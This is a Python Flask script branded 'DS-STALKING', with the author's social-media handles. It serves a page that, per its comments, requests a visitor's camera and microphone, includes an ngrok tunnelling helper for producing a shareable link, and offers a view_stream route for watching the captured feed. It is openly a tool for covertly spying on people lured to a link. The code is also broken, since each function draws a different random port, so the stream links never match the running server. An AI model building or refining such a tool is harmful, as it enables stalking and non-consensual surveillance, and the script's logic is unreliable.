from flask import Flask, render_template, request, jsonify
import socket
import pyfiglet
import subprocess
import threading
import time
import os
import random
import webbrowser

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Initialiser l'application Flask
app = Flask(__name__)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Générer un port aléatoire
def get_random_port():
    return random.randint(10000, 65535)

# Générer une URL ngrok ou un lien localhost
def get_ngrok_url():
    # Cette fonction sera utilisée pour démarrer ngrok via subprocess (optionnel)
    ngrok_process = subprocess.Popen(["./ngrok", "http", str(get_random_port())], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(5)  # Attendre que ngrok démarre
    ngrok_url = ""
    with ngrok_process.stdout:
        for line in iter(ngrok_process.stdout.readline, b""):
            if b"Forwarding" in line:
                ngrok_url = line.decode().split(" ")[1]
                break
    return ngrok_url

@app.route("/")
def home():
    # Page qui demande l'accès à la caméra et au micro
    return render_template("camera.html")

@app.route("/stream_link", methods=["POST"])
def stream_link():
    # Génère un lien contenant l'adresse IP et le port
    local_ip = get_local_ip()
    port = get_random_port()  # Port aléatoire à chaque exécution
    stream_url = f"http://{local_ip}:{port}/view_stream"
    return jsonify({"stream_url": stream_url})

# Flux vidéo
@app.route("/view_stream")
def view_stream():
    return render_template("view_stream.html")

def start_ffmpeg():
    # Utiliser ffmpeg pour afficher les informations du flux vidéo en temps réel dans le terminal
    local_ip = get_local_ip()
    port = get_random_port()  # Utiliser le même port aléatoire pour ffmpeg
    url = f"http://{local_ip}:{port}/view_stream"
    
    # Lancer ffmpeg pour obtenir des informations en temps réel sur le flux
    ffmpeg_command = ["ffmpeg", "-i", url, "-f", "null", "-"]
    subprocess.Popen(ffmpeg_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def open_browser():
    # Ouvrir un navigateur pour visualiser le flux vidéo et audio
    local_ip = get_local_ip()
    port = get_random_port()  # Utiliser un port unique pour le navigateur
    url = f"http://{local_ip}:{port}/view_stream"
    
    # Utiliser le module webbrowser pour ouvrir le lien dans un navigateur
    webbrowser.open(url)

if __name__ == "__main__":
    # Exécuter le serveur Flask avec un port aléatoire
    local_ip = get_local_ip()
    port = get_random_port()
    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")

    # Lancer ffmpeg dans un thread pour capturer les informations en temps réel
    threading.Thread(target=start_ffmpeg, daemon=True).start()

    # Ouvrir automatiquement le navigateur pour le flux vidéo
    open_browser()

    app.run(host="0.0.0.0", port=port)  # Lancer le serveur Flask sur le port généré